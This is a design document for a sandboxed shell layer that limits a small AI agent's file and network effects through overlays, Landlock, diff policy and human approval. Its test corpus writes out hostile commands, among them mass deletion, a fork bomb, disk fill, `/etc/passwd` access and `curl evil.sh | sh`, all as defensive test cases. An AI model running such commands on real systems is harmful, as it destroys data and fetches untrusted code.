# lilguy-sh: a safe shell interface for small agents

**Status:** Draft v0.2 (corrected after testing) · **Scope:** the execution layer of [lilguy](README.md) · **Platform:** Linux first

---

## 1. Summary

lilguy-sh is an MCP server that sits between a model and the filesystem. The model has no shell.
It gets two kinds of tools:

1. **Typed operations** (`list`, `read`, `find`, `grep`, `write`, `move`, `trash`) that are safe by
   construction.
2. **A sandboxed `exec`**, where arbitrary shell runs against an isolated, reversible view of
   the workspace. Its effects come back as a **diff**. A **policy outside the model** decides whether
   that diff is committed automatically, needs a human, or is rejected.

The core idea: **judge effects, not syntax.** `rm -rf src`, `find src -delete`,
`python -c 'shutil.rmtree("src")'` and `r''m -rf src` are different strings that produce the
same diff. Policy that runs on the diff doesn't care how the deletion was spelled.

---

## 2. Problem

v0.1 of lilguy screened commands with regexes. Probing showed 7 of 9 destructive commands
got through (`xargs rm`, `find -exec rm`, `shutil.rmtree`, quote-splicing, truncation via `>`,
`truncate`, `mv` out of the tree). That's not fixable by better regexes. Bash is
Turing-complete, and any interpreter (python, perl, awk) can make arbitrary system calls.

### Goals

| ID | Goal |
|---|---|
| G1 | No file outside the workspace root can be modified or deleted, however the command is written. |
| G2 | Destructive changes inside the workspace above a policy threshold never take effect without human approval. |
| G3 | Every committed change is reversible for a retention window. |
| G4 | The model never holds the authority to approve or commit its own changes. |
| G5 | Work under the threshold stays fast enough for interactive use (target < 150 ms overhead per `exec`). |
| G6 | Runs without root on a stock modern distro (kernel ≥ 5.13, bubblewrap ≥ 0.11). |

### Non-goals

- Defending against kernel exploits or a deliberately malicious, capable adversary. The threat is a
  **confused or manipulated small model**, not an APT. (Option K below raises the bar if that changes.)
- Making arbitrary interactive or long-running programs (TUIs, servers) work inside `exec`.
- macOS or Windows support in v1.

---

## 3. Threat model

**Actor:** the agent. It may hallucinate flags, misread output, over-generalise ("clean up" →
delete everything), or follow instructions injected through file contents, command output or
retrieved conventions.

| Asset | Threats | Primary control |
|---|---|---|
| Files outside the workspace | modify, delete, read secrets | Mount namespace (not visible), Landlock |
| Files inside the workspace | mass deletion, truncation, silent corruption | Overlay + diff policy + approval |
| Credentials | read `~/.ssh`, tokens in env, ssh-agent socket | Empty HOME, env scrub, no agent socket |
| Network / remote state | `git push --force`, exfiltration, `curl \| sh` | Network namespace off by default |
| Host processes | kill, signal, ptrace | PID namespace |
| Host resources | fork bomb, disk fill, memory | cgroup limits, size cap on the upper layer |
| The guard itself | model edits the policy or approves itself | Separate process; policy and approval channel unreachable from the sandbox |

---

## 4. Design principles

1. **Effects over syntax.** Enforce at the filesystem and syscall layer, where intent has become behaviour.
2. **Preview before effect.** Changes land somewhere disposable first; the real tree changes only on commit.
3. **Reversible by default.** Deletion means trash; commit keeps an undo record.
4. **Separation of privilege.** The model proposes, the server executes, the policy decides, a human approves.
5. **Defence in depth with independent failure modes.** No single mechanism is trusted alone.
6. **Small-model ergonomics.** Typed tools and compact observations reduce what the model has to get right.

---

## 5. Isolation options explored

Eleven mechanisms, evaluated against the goals. They aren't mutually exclusive: §6 combines several.

### A. Syntactic policy (regex or shell AST)

Parse the command (regex, `bashlex`, tree-sitter-bash) and block patterns.

- **Pros:** Zero runtime cost, portable, gives instant feedback before anything runs.
- **Cons:** Unsound by construction. Interpreters, `eval`, variable expansion, aliases and quoting defeat it. AST parsing helps with `r''m`, but not with `python -c`. Rewards evasion.
- **Verdict:** Keep only as an **advisory pre-check** for network/privilege commands and for friendly early errors. Never as a security boundary.

### B. Typed tools only (no shell)

Expose structured operations with validated arguments.

- **Pros:** Safe by construction. Arguments are data, so limits are trivial ("at most 50 paths, all under root, to trash"). Smallest action space, which suits tiny models. No quoting problems.
- **Cons:** Loses composition (pipes, awk, ad-hoc glue). Every capability has to be built. Covers maybe 80% of real use.
- **Verdict:** **Primary interface**, with an escape hatch for the rest.

### C. Copy-on-write overlay + diff + commit

Run `exec` in bubblewrap with the workspace mounted as an overlay: the real tree is the read-only
lower layer, and writes go to a private upper directory (`bwrap --overlay-src <ws> --overlay <upper> <work> <ws>`).
Deletions show up as whiteout files. After the step, walk the upper directory to build the diff.

- **Pros:** Syntax-independent. The real tree is untouched until commit. **Diff cost is O(changes)**, because only the upper dir is walked. Unprivileged (needs a non-setuid bwrap ≥ 0.11, kernel overlayfs in user namespaces ≥ 5.11). Discard is just `rm -rf upper`.
- **Cons:** Overlay semantics quirks: first write to a large file copies the whole file up; renaming a directory needs `redirect_dir` or a full copy-up; hardlinks break on copy-up; inode numbers change. Committing back is a separate, non-atomic step. Some tools behave oddly (file watchers, things that check inode identity).
- **Verdict:** **Recommended primary mechanism for `exec`.**

### D. Reflink scratch copy + diff + sync back

Clone the workspace into a scratch dir with `cp -a --reflink=auto`, run there, diff scratch against the original, and apply.

- **Pros:** Simple, no overlay quirks, and every tool sees a normal filesystem. Near-instant and space-free on btrfs/XFS/bcachefs reflinks. Could work on macOS later via APFS `clonefile`.
- **Cons:** Without reflink support it's a full copy (unusable on big trees on ext4). The diff is O(tree), not O(changes), unless you track mtimes. Needs separate isolation for G1, since the process can still see the host unless it's also namespaced.
- **Verdict:** **Fallback** for filesystems or kernels where C isn't available, and an interesting macOS path.

### E. Filesystem snapshots (ZFS / btrfs) on the real tree

Snapshot the workspace subvolume before each step; run against the real tree; roll back on demand.

- **Pros:** Native speed, no semantic quirks, atomic rollback, cheap. A great host-level backstop for G3.
- **Cons:** Effects happen *before* review: detect and roll back, not preview and approve, so anything reading the tree in between sees the damage. Needs the workspace on ZFS/btrfs, and usually privileges or delegated permissions (`zfs allow`). Rollback is all-or-nothing for the dataset.
- **Verdict:** **Optional backstop** under C/D, not the primary control.

### F. Landlock path rules

An unprivileged kernel LSM. The sandboxed process gets explicit rights per directory tree, e.g.
`REMOVE_FILE`/`REMOVE_DIR` only under `./build`, `WRITE_FILE` only under the workspace,
`TRUNCATE` (ABI ≥ 3) only under scratch paths, and TCP connect denied (ABI ≥ 4).

- **Pros:** Syntax-independent and enforced by the kernel. Unprivileged, inherited by every child process, can't be undone from inside. Catches deletion and truncation however they're spelled. Degrades gracefully by ABI version.
- **Cons:** Allow or deny only, with no "preview" or "count" (it can't express "at most 50 deletions"). Needs kernel ≥ 5.13; truncate control needs ABI 3 (6.2), network needs ABI 4 (6.7). Coarse: rights apply to whole subtrees.
- **Verdict:** **Recommended outer fence.** Confines all writes to the workspace and `/tmp` and blocks TCP, independently of the mount setup. **It can't protect a subpath of a writable tree** (verified: `.git` under a writable workspace rule stays writable), so protected paths are enforced with read-only bind mounts instead (§6).

### G. seccomp syscall filtering

Deny `unlink`, `unlinkat`, `rmdir`, `rename*`, `truncate` and friends outright.

- **Pros:** Absolute and simple. Ignores syntax. Low overhead.
- **Cons:** Not path-aware (no deref of pointer arguments), so it's all-or-nothing. Breaks ordinary tools that use temp files and atomic renames (editors, compilers, git, package managers). `open(O_TRUNC)` can't be separated from normal writes.
- **Verdict:** **Rejected as a primary control**; possibly useful for "read-only exec" mode.

### H. eBPF LSM deletion budget

Attach BPF-LSM programs to `inode_unlink` / `inode_rmdir` / `path_truncate`, keep a per-session
counter, and deny once the budget is spent.

- **Pros:** The only kernel mechanism that can express **rate or volume** ("max 50 deletions per step"). Path-aware. Syntax-independent.
- **Cons:** Needs privilege (`CAP_BPF` + `CAP_MAC_ADMIN`) and a kernel with `lsm=bpf` enabled. Complex to write and ship. Denial mid-command leaves partial state, so it needs C or E for cleanup anyway.
- **Verdict:** **Interesting future option**, mostly redundant once C's diff policy exists.

### I. FUSE soft-delete filesystem

Mount the workspace through a FUSE layer that turns `unlink`/`rmdir` into moves to `.trash/`
and records truncations with a backup.

- **Pros:** Syntax-independent and reversible. Works with any tool. Can enforce quotas in the FUSE daemon.
- **Cons:** A custom filesystem to write and maintain. FUSE overhead on every I/O. Edge cases (mmap, locks, rename-over). Duplicates most of what C already gives for free.
- **Verdict:** **Not worth building**; C is the same idea using kernel-maintained code.

### J. Git checkpoints

Commit or stash before each step; `git diff` afterwards; reset to undo.

- **Pros:** Zero infrastructure in git repos. Human-readable diffs. Familiar tooling.
- **Cons:** Only covers tracked files: ignored and untracked files (build output, `.env`, data) are invisible or get destroyed by `git clean`. The model can run git itself and rewrite the checkpoints. No isolation.
- **Verdict:** **Useful for display and audit**, not for safety.

### K. Container or microVM (Podman, gVisor, Firecracker)

Run `exec` inside a full container, a user-space kernel (gVisor) or a microVM.

- **Pros:** The strongest isolation, which matters if the threat model ever includes deliberate escape attempts. gVisor/Firecracker shrink the kernel attack surface. Mature tooling.
- **Cons:** Doesn't solve the in-workspace problem by itself (a mounted workspace can still be wiped), so it still needs C/D/E. Higher startup latency (gVisor ~100s of ms; Firecracker ~125 ms plus image). Heavier operations.
- **Verdict:** **Optional outer shell** for untrusted models or multi-tenant use. Same interface, different backend.

### Comparison

| | Ignores syntax | Preview before effect | Reversible | Unprivileged | Volume limits | Overhead | Complexity |
|---|:-:|:-:|:-:|:-:|:-:|:-:|:-:|
| A Syntactic | ✗ | ✓ | ✗ | ✓ | ✗ | none | low |
| B Typed tools | ✓ | ✓ | ✓ | ✓ | ✓ | none | med |
| **C Overlay** | ✓ | ✓ | ✓ | ✓ | ✓ (on diff) | low | med |
| D Reflink copy | ✓ | ✓ | ✓ | ✓ | ✓ (on diff) | low–high | low |
| E Snapshots | ✓ | ✗ | ✓ | partial | ✗ | very low | low |
| **F Landlock** | ✓ | ✗ | ✗ (prevents) | ✓ | ✗ | very low | low |
| G seccomp | ✓ | ✗ | ✗ (prevents) | ✓ | ✗ | very low | low |
| H eBPF LSM | ✓ | ✗ | ✗ | ✗ | ✓ | low | high |
| I FUSE trash | ✓ | ✗ | ✓ | ✓ | ✓ | med | high |
| J Git | partial | ✓ | partial | ✓ | ✓ | low | low |
| K Container/VM | n/a | ✗ | ✗ | partial | ✗ | med | med |

---

## 6. Recommended architecture

```
 ┌───────────┐  MCP   ┌──────────────────────── lilguy-sh (host process) ────────────────────────┐
 │   model   │ ─────► │  typed tools ──► validate ──► stage into session upper ─┐                │
 │ (no shell)│ ◄───── │                                                         ▼                │
 └───────────┘        │  exec ──► bwrap ┬ mount ns: only workspace + ro /usr, /bin, /lib         │
                      │                 ├ overlay: lower = workspace, upper = session/upper      │
                      │                 ├ ro binds over protected paths (.git, .lilguy, .env)    │
                      │                 ├ Landlock: writes only in workspace, /tmp; no TCP       │
                      │                 ├ net ns: no network (default)                           │
                      │                 ├ pid ns, empty HOME, scrubbed env                       │
                      │                 └ cgroup: mem / cpu / pids / time, upper size cap        │
                      │                                                         │                │
                      │  diff (walk upper) ──► policy ──► auto-commit │ pending │ reject         │
                      │                                       │          │                       │
                      │                     commit + undo log ◄┘          └──► human approval ──┐│
                      └──────────────────────────────────────────────────────────── (not MCP) ──┘│
                       optional: ZFS/btrfs snapshot of workspace before each commit (backstop)
```

**Why this composition:**

- **C (overlay)** gives preview, volume-aware policy and free discard. It's the main control.
- **Read-only binds + F (Landlock)** are independent fences. Protected paths are read-only mounts
  inside the sandbox (verified: write → `EROFS`, `mv` → `EBUSY`), and Landlock confines writes to the
  workspace and `/tmp`. Both hold even if the diff, policy or commit code has a bug.
- **B (typed tools)** handle the common cases with zero shell risk and better small-model accuracy.
  They write to the **same session upper layer**, so typed and `exec` changes share one diff and one policy.
- **Namespaces + cgroups** cover what a filesystem diff can't see: network, processes, credentials, resources.
- **E (snapshots)** is optional, for users whose workspace already sits on ZFS/btrfs.
- **D (reflink)** is the fallback backend when overlay isn't available.
- **K** is a pluggable backend for higher-threat settings.

---

## 7. Session and transaction model

A **session** = one agent task. It owns one **upper layer** that accumulates changes across steps,
so multi-step work (create dir → write file → build) sees its own earlier effects before
anything is committed.

```
open ──► step* ──► commit │ discard
           │
           └─ each step: run → diff(step) → policy(step) ─┬─ ok      → continue (still uncommitted)
                                                          ├─ pending → block further steps until a human decides
                                                          └─ reject  → roll the step back (restore upper snapshot)
```

- **Per-step policy, per-session commit.** Policy runs after every step so bad steps are stopped
  early. Commit happens at the end (or when the agent calls `changes.commit`). This avoids a
  half-done task landing in the real tree.
- **Step rollback.** Each step gets its own upper layer; earlier steps' uppers are stacked as lower
  layers (verified: whiteouts in a stacked lower are honoured). A rejected step is undone by dropping
  its layer, with no copying.
- **Conflict detection.** At session open, record `(mtime, size, inode)` for each lower path the
  session later touches. At commit, re-check them. If the real tree changed underneath (a human
  edited a file meanwhile), mark the commit as conflicted and require approval.

---

## 8. Interface (MCP tools)

All paths are relative to the workspace root. Absolute paths, `..` escapes and symlinks
that resolve outside the root are rejected before anything runs.

### Typed tools

| Tool | Args | Notes |
|---|---|---|
| `fs.list` | `path`, `depth≤3` | Names, types, sizes |
| `fs.read` | `path`, `offset`, `limit` | Text only; binary → metadata |
| `fs.find` | `path`, `name_glob`, `type`, `max_results` | |
| `fs.grep` | `pattern`, `path`, `glob`, `max_results` | Fixed-string by default; `regex: true` opt-in |
| `fs.write` | `path`, `content`, `mode: create\|overwrite\|append` | `overwrite` of an existing file counts as a modification in the diff |
| `fs.move` | `src`, `dst`, `overwrite: false` | |
| `fs.trash` | `paths[]` (≤ 50) | Moves to `.lilguy-trash/<session>/` (not `.lilguy/`, which is read-only); never unlinks |
| `fs.restore` | `trash_id` | |

### Shell escape hatch

| Tool | Args | Returns |
|---|---|---|
| `exec` | `cmd`, `timeout_s≤60`, `expect: ok\|output\|fail` | `{digest, step_diff_summary, policy: ok\|pending\|rejected, reason}` |

### Change control

| Tool | Args | Notes |
|---|---|---|
| `changes.diff` | `detail: summary\|paths\|full` | Session diff so far |
| `changes.commit` | `message` | Applies the diff only if the policy allows it, or a human has already approved. **The model can't approve.** |
| `changes.discard` | | Drops the upper layer |

### Observation returned to the model

```
exit=0
stdout (3 lines): ...
changes: +2 files, ~1 modified, -14 deleted (build/**)   policy=ok
```

If the policy says pending:

```
changes: -214 deleted (src/**)   policy=PENDING_APPROVAL(rule=max_deletes_outside_build)
note: a human must approve before you continue. You can ask, or discard.
```

---

## 9. Diff and policy

### Diff entries

Built by walking the upper layer: whiteouts → `deleted`; opaque dirs → `replaced_dir`;
files present in lower → `modified`; otherwise `added`. Each entry is
`{op, path, size_before, size_after, mode_change, is_binary, is_symlink, symlink_target}`.

### Policy file (`.lilguy/policy.yaml`, read by the server, never mounted writable)

```yaml
protected:                 # also enforced by read-only bind mounts (when the path exists)
  - .git/**
  - .lilguy/**
  - "**/.env"
auto_commit:
  max_deletes: 20
  max_modified: 50
  max_bytes_written: 50MB
  delete_free_paths: [build/**, dist/**, "**/__pycache__/**", "**/*.tmp"]
require_approval:
  - any_delete_outside: [build/**, dist/**, "**/*.tmp"]
  - truncated_to_zero: true        # file shrank to 0 bytes
  - mode_change: executable_bit
  - symlink_target_outside_root: true
  - session_conflict: true
reject:
  - path_matches: protected
  - special_files: true            # devices, fifos, sockets
```

**Evaluation order:** reject → require_approval → auto_commit limits → ok.

### Approval channel

Approval goes **outside** the model's MCP session: an MCP elicitation surfaced by the client UI,
a CLI prompt, or a notification to a separate approver. The approver sees the summary, the top paths
by size, and the full path list on demand. Each approval is bound to a specific diff hash, so
changes made after the approval aren't covered by it.

---

## 10. Non-filesystem effects

| Effect | Default | Opt-in |
|---|---|---|
| Network | `--unshare-net` (none) | Proxy with a domain allowlist; Landlock TCP rules (ABI ≥ 4) |
| Credentials | Empty tmpfs `HOME`, no `SSH_AUTH_SOCK`, env allowlist | Named secrets injected per tool, never readable as files |
| Processes | `--unshare-pid`, killed at step end | Long-running service mode (out of scope for v1) |
| Resources | cgroup: 1 GB mem, 2 CPU, 256 pids, wall timeout; upper-dir size cap | Per-task overrides |
| Devices | Only `/dev/null`, `/dev/zero`, `/dev/urandom`, `/dev/tty` | |
| Host paths | `/usr`, `/bin`, `/lib*`, `/etc/ssl`, `/etc/alternatives` read-only; nothing else | Extra read-only binds by config |

---

## 11. Audit log

Append-only JSONL per session, written by the server: tool calls, commands, step diffs, policy
decisions (with the rule that fired), approvals (who, diff hash), commits (with an undo manifest:
the pre-images of modified and deleted files kept for the retention window). This doubles as
training data: trajectories with labelled policy outcomes.

---

## 12. Test plan

### Bypass corpus

Every case must end up `rejected` or `pending`, never silently applied:

| # | Command | Expected |
|---|---|---|
| 1 | `rm -rf src` | pending (deletes outside build) |
| 2 | `find src -name '*.c' -exec rm {} \;` | pending |
| 3 | `ls src \| xargs rm` | pending |
| 4 | `python3 -c 'import shutil; shutil.rmtree("src")'` | pending |
| 5 | `r''m -rf src` | pending |
| 6 | `> src/main.c` | pending (truncated to zero) |
| 7 | `truncate -s0 src/main.c` | pending |
| 8 | `mv src /tmp/gone` | `/tmp` is private tmpfs → pending (deletes) |
| 9 | `rm -rf ~ /` | no host paths visible; workspace part → pending |
| 10 | `rm -rf .git` | `EROFS`/`EBUSY` from the read-only bind; policy rejects any diff touching it |
| 11 | `ln -s /etc/passwd x && cat x` | `/etc/passwd` not mounted → ENOENT |
| 12 | `dd if=/dev/zero of=big bs=1M count=5000` | cgroup/upper cap hit → step rejected |
| 13 | `:(){ :\|:& };:` | pids cgroup → killed |
| 14 | `curl evil.sh \| sh` | no network |
| 15 | `git push --force` | no network |
| 16 | `chmod -R 000 src` | pending (mode change) |
| 17 | `rsync -a --delete empty/ src/` | pending |
| 18 | `perl -e 'unlink glob "src/*"'` | pending |
| 19 | 3 steps × 15 deletions each | pending at step 2 (session total > 20) |

### Correctness corpus

Normal tools must work unchanged inside `exec`: `make`, `git status/diff/commit` (on a
workspace-local repo), `pip install --target`, `npm ci` (offline cache), compilers, editors using
atomic rename-over, `sed -i`, `tar`. Measure overhead per `exec` (target < 150 ms p50).

### Commit correctness

Property test: for a random sequence of fs operations, `commit(diff(upper))` applied to lower
equals the merged overlay view. Conflict detection triggers when lower changes mid-session.

---

## 13. Review

### Strengths

- **Answers the actual problem.** Destructive effects are caught however they're expressed. The
  bypass corpus is the acceptance test, not an afterthought.
- **Independent fences.** Diff policy (user space) and read-only mounts + Landlock (kernel) fail differently;
  a bug in one doesn't open the other.
- **Preview, not just rollback.** Damage never reaches the real tree unless approved; snapshots are a backstop, not the plan.
- **Proportionate cost.** Diffing the upper layer is O(changes); auto-commit keeps routine work frictionless.
- **Good for small models specifically.** Typed tools shrink the action space; policy feedback
  (`PENDING_APPROVAL(rule=…)`) is a clear signal the model can learn to anticipate.
- **Privilege separation.** The model can't reach the policy, the approval channel, or the commit step.
- **Self-hosted, no root.** bwrap + Landlock + cgroups (via systemd user slices) on a stock distro.

### Weaknesses and risks

| Risk | Severity | Mitigation |
|---|---|---|
| **Commit isn't atomic.** Applying a diff to the real tree can fail halfway (disk full, permission). | High | Write pre-images to the undo log *first*; apply; on failure, replay the undo log. Optional snapshot (E) before commit. |
| **Overlay quirks** (copy-up of large files, directory renames, hardlinks, inode changes) | Med | Enable `redirect_dir`/`metacopy` where available; document; fall back to D per session if a tool misbehaves. |
| **Approval fatigue.** Too many pending prompts → humans rubber-stamp. | Med | Tune thresholds per project; build/output paths free; show ranked, human-readable summaries; batch per session. |
| **Diff can't see semantic damage** (a valid-looking edit that breaks the code, a modified config) | Med | Out of scope for the filesystem layer; that's what tests/check scripts are for. |
| **External state not in the filesystem** (databases, docker.sock, remote APIs) | Med | Not mounted by default; each one needs its own typed tool with its own policy. |
| **Kernel/distro variance** (unprivileged userns disabled on some distros, e.g. AppArmor restrictions on Ubuntu ≥ 23.10; Landlock ABI differences) | Med | Capability probe at startup; refuse to run `exec` (typed tools only) if isolation is incomplete, and report exactly what's missing. |
| **Prompt injection via file contents** asking the model to request approval for something harmful | Med | The approver sees the diff, not the model's justification; justification shown but marked untrusted. |
| **Upper layer leaks secrets read from lower** | Low | Upper dir is private (0700), per-session, deleted on discard/commit. |
| **Performance on huge monorepos** | Low | Overlay doesn't scan lower; only conflict-tracked paths are stat'ed. |

### Trade-offs accepted

- **Linux-only** for v1. A macOS path exists (APFS clonefile for D + `sandbox-exec`, which is deprecated but still works), but it's a separate project.
- **No interactive or long-running processes** inside `exec`. Servers and TUIs need a different mode.
- **Per-session commit** means the real tree lags behind the agent's view until commit. That's
  intentional, but surprising to humans watching the directory.

### Alternatives rejected and why

- **Regex/AST policy as the boundary (A):** unsound; shown empirically.
- **seccomp-only (G):** breaks normal tools; not path-aware.
- **FUSE trash filesystem (I):** reimplements overlayfs badly.
- **Snapshots as the primary control (E):** detect-and-undo, not preview; anything reading the tree in between sees the damage.
- **Git as the safety net (J):** blind to untracked/ignored files, and the model can rewrite it.

### Open questions

1. **Should the model see the full diff** or only the summary? More detail helps it self-correct but costs context.
2. **Policy learning:** should approvals feed back into per-project thresholds (e.g. "user always approves deleting `coverage/`")? Useful, but it's another surface for slow drift.
3. **Multi-agent sessions:** if two agents share a workspace, do they share an upper layer or get separate ones and merge at commit?
4. **eBPF budget (H)** as an extra fence for hosts where it's available: worth the complexity?

---

## 14. Milestones

| Phase | Deliverable | Exit criterion |
|---|---|---|
| M0 | Capability probe (userns, overlay-in-userns, bwrap version, Landlock ABI, cgroup delegation) | Clear report on target machines |
| M1 | `exec` in bwrap + overlay + namespaces; diff of upper; discard | Bypass corpus #1–9, #11, #14–15 produce correct diffs |
| M2 | Policy engine + per-step rollback + pending state | Whole bypass corpus passes |
| M3 | Read-only binds for protected paths + Landlock outer fence | #10 blocked at mount level even with policy disabled |
| M4 | Typed tools sharing the session upper layer | Typed and exec changes appear in one diff |
| M5 | Commit with undo log, conflict detection, approval channel | Commit property test passes; kill -9 during commit recovers |
| M6 | Wire into lilguy eval harness; measure pass rate and overhead | Eval suite runs on lilguy-sh with < 150 ms p50 overhead |
| M7 (opt) | Reflink backend (D), snapshot backstop (E), container backend (K) | Same tests pass on each backend |

---

## References

- bubblewrap `--overlay`, `--tmp-overlay`, `--ro-overlay`, `--overlay-src`: added in v0.11.0, unavailable in setuid installs (bwrap(1); containers/bubblewrap#547)
- Landlock: `REMOVE_FILE`/`REMOVE_DIR` (ABI 1), `REFER` (ABI 2), `TRUNCATE` (ABI 3), TCP bind/connect (ABI 4), `IOCTL_DEV` (ABI 5) (landlock(7); kernel userspace-api docs)
- lilguy README, design review §2: regex policy bypass results
